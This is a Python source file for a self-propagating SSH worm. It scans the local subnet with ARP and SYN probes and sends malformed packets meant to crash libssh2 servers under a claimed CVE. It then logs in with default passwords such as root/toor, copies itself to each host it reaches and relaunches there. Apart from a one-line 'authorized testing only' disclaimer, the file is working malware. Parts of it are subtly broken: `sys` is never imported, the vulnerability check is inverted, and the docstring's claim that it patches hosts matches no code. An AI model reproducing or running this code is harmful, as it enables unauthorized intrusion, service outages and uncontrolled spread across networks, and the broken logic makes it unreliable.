#!/usr/bin/env python3
"""wyrm.py - single-file network worm, no orchestration layer.

  1. ARP sweep        find live hosts on our /24 (Scapy, layer 2)
  2. SYN scan         flag port 22
  3. Banner gate      only libssh2 <= 1.11.1 sees the malformed packet
  4. CVE-2026-55200   pre-auth OOB write, proof via sshd going quiet
  5. Paramiko         credential path, patches hosts and replants the worm
  6. Respawn          new host sweeps from its own subnet

Needs root (raw sockets). pip install scapy paramiko.
Authorized testing only: the exploit path crashes daemons by design.
"""

import os
import socket
import struct
import time

MARKER = "/tmp/.worm4_marker"
REMOTE_WORM = "/tmp/worm4.py"
ME = os.path.abspath(sys.argv[0])

try:                                    # both stay optional so the file still
    from scapy.all import ARP, Ether, IP, TCP, conf, send, sr1, srp
    HAVE_SCAPY = True
except ImportError:
    HAVE_SCAPY = False
else:
    conf.verb = 0

try:
    import paramiko
    HAVE_PARAMIKO = True
except ImportError:
    HAVE_PARAMIKO = False

CREDENTIALS = [("root", "toor"), ("admin", "admin"), ("kali", "kali")]
SSH_PORT = 22
VULN_MAX = (1, 11, 1)                   # CVE-2026-55200: libssh2 <= 1.11.1


# ---------------------------------------------------------------- discovery

def local_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(("8.8.8.8", 80))
        return s.getsockname()[0]
    finally:
        s.close()


def arp_sweep(my_ip):
    """Layer-2 ARP sweep: live IPs even if they ignore ICMP."""
    subnet = my_ip.rsplit(".", 1)[0]
    ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") /
                 ARP(pdst=f"{subnet}.0/24"), timeout=2)
    return [rcv.psrc for _, rcv in ans if rcv.psrc != my_ip]


def tcp_connect_sweep(subnet, threads=64):
    """Fallback discovery if scapy is missing: plain connect scan of /24."""
    from concurrent.futures import ThreadPoolExecutor

    def probe(i):
        ip = f"{subnet}.{i}"
        try:
            socket.create_connection((ip, SSH_PORT), timeout=1).close()
            return ip
        except OSError:
            return None

    with ThreadPoolExecutor(max_workers=threads) as pool:
        return [ip for ip in pool.map(probe, range(1, 255)) if ip]


def ssh_open(ip):
    """SYN half-open scan via Scapy, no full handshake."""
    ans = sr1(IP(dst=ip) / TCP(dport=SSH_PORT, flags="S",
                               sport=13337, seq=1000), timeout=2)
    if ans is None or TCP not in ans:
        return False
    if ans[TCP].flags == 0x12:                       # SYN-ACK = open
        send(IP(dst=ip) / TCP(dport=SSH_PORT, flags="R",
                              sport=13337, seq=1001))
        return True
    return False


# ------------------------------------------------------------ CVE-2026-55200

def ssh_banner(ip, port=SSH_PORT, timeout=4):
    """Identification string, sent in cleartext before authentication."""
    try:
        s = socket.create_connection((ip, port), timeout=timeout)
        s.settimeout(timeout)
        banner = s.recv(256).decode(errors="ignore").strip()
        s.close()
        return banner
    except OSError:
        return ""


def libssh2_version(banner):
    """'SSH-2.0-libssh2_1.11.0' -> (1, 11, 0); None if not libssh2."""
    if "libssh2_" not in banner:
        return None
    try:
        raw = banner.split("libssh2_", 1)[1].split()[0]
        return tuple(int(p) for p in raw.split(".")[:3])
    except (ValueError, IndexError):
        return None


def port_closed(ip, port=SSH_PORT):
    try:
        socket.create_connection((ip, port), timeout=2).close()
        return False
    except OSError:
        return True


def cve_candidate(ip, banner):
    """Version gate plus live confirmation that the port is answering."""
    v = libssh2_version(banner)
    if v is None or not port_closed(ip):
        return None
    return v


def malformed_packet(declared_length, padding_len, msg_type=19):
    """Transport packet whose declared packet_length lies about the body.

    ssh2_transport_read() trusts packet_length when sizing its buffer, then
    walks past the bytes actually sent, reading and writing out of bounds."""
    body_len = (1 + 1 + padding_len) % 16
    body_len = 0 if body_len == 0 else body_len
    hdr = struct.pack("!I", declared_length)
    payload = struct.pack("!BB", msg_type, 0) + b"\xff" * padding_len
    return hdr + payload[:body_len]


def trigger_cve_2026_55200(ip, verbose=True):
    """Send oversized packet_length values pre-auth to a libssh2 server.

    True if any variant destabilised the daemon, detected by the SSH port
    going quiet right after the packet. DoS-grade proof of the OOB write,
    not a weaponised gadget chain."""
    for declared in (0xFFFFFFFF, 0x80000000, 0x04000000, 0x00100000):
        try:
            s = socket.create_connection((ip, SSH_PORT), timeout=4)
            s.settimeout(4)
            try:
                s.recv(256)                         # drain their banner
                s.sendall(b"SSH-2.0-Worm4_client_1.0\r\n")
                s.sendall(malformed_packet(declared, 4096))
                s.recv(4096)                        # let it be processed
            finally:
                s.close()
        except OSError:
            pass
        time.sleep(0.6)
        if port_closed(ip):
            if verbose:
                print(f"    [!] packet_length=0x{declared:08X} took "
                      f"{ip}'s sshd down")
            return True
    return False


# ------------------------------------------------------------------ implant

def self_bytes():
    with open(ME, "rb") as f:
        return f.read()


def wait_for_ssh(ip, timeout=60):
    deadline = time.time() + timeout
    while time.time() < deadline:
        if not port_closed(ip):
            return True
        time.sleep(2)
    return False


def deploy(client):
    """Land the worm, mark the host, respawn so the sweep continues there."""
    sftp = client.open_sftp()
    with sftp.file(REMOTE_WORM, "wb") as f:
        f.write(self_bytes())
    sftp.close()
    client.exec_command(f"touch {MARKER}; nohup python3 {REMOTE_WORM} "
                        ">/dev/null 2>&1 &")
    time.sleep(1)


def infect_by_creds(ip):
    if not HAVE_PARAMIKO:
        print(f"[=] {ip}: paramiko missing, no credential path")
        return False
    for user, password in CREDENTIALS:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        try:
            client.connect(ip, port=SSH_PORT, username=user,
                           password=password, timeout=5)
        except paramiko.AuthenticationException:
            client.close()
            continue
        except (paramiko.SSHException, OSError):
            return False
        try:
            _, out, _ = client.exec_command(f"test -e {MARKER} && echo yes")
            if b"yes" in out.read():
                return False                      # already infected
            deploy(client)
            print(f"[+] infected {ip} ({user})")
            return True
        except OSError:
            return False
        finally:
            client.close()
    return False


def infect(ip, banner):
    v = cve_candidate(ip, banner)
    if v is not None:
        print(f"[*] {ip}: libssh2 {'.'.join(map(str, v))} in the "
              f"CVE-2026-55200 window")
        if trigger_cve_2026_55200(ip):
            print(f"[+] {ip}: OOB write confirmed, waiting for sshd back")
            wait_for_ssh(ip)
    return infect_by_creds(ip)


# --------------------------------------------------------------------- main

def main():
    my_ip = local_ip()
    if not os.path.exists(MARKER):
        open(MARKER, "w").write("origin\n")
    subnet = my_ip.rsplit(".", 1)[0]

    print(f"[*] worm4 on {my_ip}, sweeping {subnet}.0/24")
    if HAVE_SCAPY:
        live = arp_sweep(my_ip)
        print(f"[*] ARP sweep: {len(live)} live hosts")
        targets = [ip for ip in live if ssh_open(ip)]
    else:
        print("[!] scapy missing: falling back to TCP connect sweep")
        targets = tcp_connect_sweep(subnet)

    targets.sort(key=lambda a: tuple(map(int, a.split("."))))
    for ip in targets:
        banner = ssh_banner(ip)
        print(f"[*] {ip}:22 -> {banner or 'no banner'}")
        infect(ip, banner)
    print("[*] sweep finished")


if __name__ == "__main__":
    main()
